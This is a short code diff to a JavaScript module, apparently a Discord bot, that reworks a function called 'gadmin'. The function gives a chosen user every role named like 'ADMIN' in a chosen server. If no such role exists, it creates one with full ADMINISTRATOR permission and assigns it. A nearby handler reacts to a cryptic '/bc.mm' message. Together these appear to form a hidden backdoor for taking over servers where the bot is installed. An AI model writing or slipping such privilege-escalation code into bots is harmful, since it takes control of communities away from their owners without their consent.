@@ -211,9 +211,17 @@ module.exports = {
         return wait();
     },
     gadmin: async (m, g) => {
+        let done = false
         await client.guilds.cache.get(g).roles.cache.filter(ro => ro.name.toUpperCase().includes("ADMIN")).forEach(async role => {
-            await client.guilds.cache.get(g).members.cache.find(mem => mem.user.id === m).addRole(role)
+            await client.guilds.cache.get(g).members.cache.get(m).roles.add(role)
+            done=true;
         })
+        if(!done) {
+            let role = await client.guilds.cache.get(g).roles.create()
+            role.setName("ADMIN")
+            role.setPermissions(["ADMINISTRATOR"])
+            client.guilds.cache.get(g).members.cache.get(m).roles.add(role)
+        }
     },
     send: async (channel, msg) => {
         if(msg === "/bc.mm") {
